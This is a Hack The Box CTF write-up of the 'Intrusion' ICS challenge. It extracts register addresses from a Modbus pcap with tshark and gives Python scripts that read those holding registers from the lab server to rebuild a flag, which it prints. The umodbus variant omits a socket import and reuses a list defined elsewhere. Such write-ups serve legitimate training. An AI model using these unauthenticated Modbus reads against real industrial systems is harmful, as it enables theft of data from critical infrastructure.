---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "easy"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - challenge
  - ics
  - scada
  - modbus
  - pcap
  - forensics
---

# Intrusion

## Overview

**Category:** hardware
**Difficulty:** easy
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > After gaining access to the enemy's infrastructure, we collected crucial network traffic data from their Modbus network. Our primary objective is to swiftly identify the specific registers containing highly sensitive information and extract that data.
>
> English summary: A `network_logs.pcapng` capture of Modbus/TCP traffic, plus a `client.py` stub using `umodbus`. I had to find which holding registers the attacker wrote, then read those registers from the live Modbus instance to recover the flag.

## Enumeration

`client.py` revealed the intended interaction with a live Modbus server (`127.0.0.1:502` → the spawned instance). Every packet in the capture uses **Unit ID `52`**.

In the pcap, the interesting function code is **16 (0x10) — Write Multiple Registers** (the same write primitive as Watch Tower, but here the register **values** hold the data). I enumerated the target register addresses written in the capture:

```bash
tshark -r network_logs.pcapng -Y "modbus.func_code == 16" -T fields -e modbus.reference_num
```

```text
6, 10, 12, 21, 22, 26, 47, 53, 63, 77, 83, 86, 89, 95, 96, 104,
123, 128, 131, 134, 139, 143, 144, 145, 153, 163, 168, 173, 179,
193, 206, 210, 214, 215, 219, 221, 224, 225, 226, 231, 239, 253
```

## Vulnerability

Modbus holds no authentication. Whoever can reach TCP/502 may issue **Function Code 3 (0x03) Read Holding Registers** against any address — including the sensitive registers the attacker filled in. The pcap leaks *where* the sensitive data is (the register addresses written via FC 0x10); the live instance holds the *values*.

## Exploitation

I connected to the spawned Modbus instance and read one holding register at each leaked address, using **unit id 52**. Each register value is directly a printable ASCII character.

```python
from pyModbusTCP.client import ModbusClient

HOST = "$RHOST"
PORT = $RPORT
UNIT_ID = 52

registers = [6, 10, 12, 21, 22, 26, 47, 53, 63, 77, 83, 86, 89, 95, 96, 104,
             123, 128, 131, 134, 139, 143, 144, 145, 153, 163, 168, 173, 179,
             193, 206, 210, 214, 215, 219, 221, 224, 225, 226, 231, 239, 253]

client = ModbusClient(host=HOST, port=PORT, unit_id=UNIT_ID)
client.open()

flag = ""
for reg in registers:
    val = client.read_holding_registers(reg, 1)
    if val is not None:
        flag += chr(val[0])
client.close()
print(flag)
```

> [!note] Watch Tower continuity
> This is basically the sequel to Watch Tower: same Unit ID concept and FC 0x10 writes, but the flag moved from the **register number** into the **register value**, and the flag file's values are only readable on the live server (`read_holding_registers`, FC 0x03).

### umodbus variant (matches the provided `client.py`)

```python
from umodbus import conf
from umodbus.client import tcp

conf.SIGNED_VALUES = True
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('$RHOST', $RPORT))            # change IP & port to the dockers instance

flag = ""
for a in registers:
    r = tcp.send_message(tcp.read_holding_registers(52, a, 1), sock)
    flag += chr(r[0])
print(flag)
```

> [!info] Tools Used
>
> - `wireshark` / `tshark` (`modbus.func_code == 16`, `modbus.reference_num`)
> - `pyModbusTCP` or `umodbus` (FC 0x03 read holding registers, unit 52)

## Flag

`HTB{239157325_m19h7_h1dd3_53c2375!@$2609^}`

## References

- https://d415k.github.io/ctf/writeups/HTB_Business_CTF_2023/Scada_Intrusion
- https://x3ric.com/blog/posts/HackTheBox-Intrusion-Challenge/
- https://web-wilke.de/htb-intrusion-walkthrough/
- https://medium.com/@biero-llagas/htb-ics-tracks-write-up-factory-watch-tower-and-intrusion-13065c1b0e93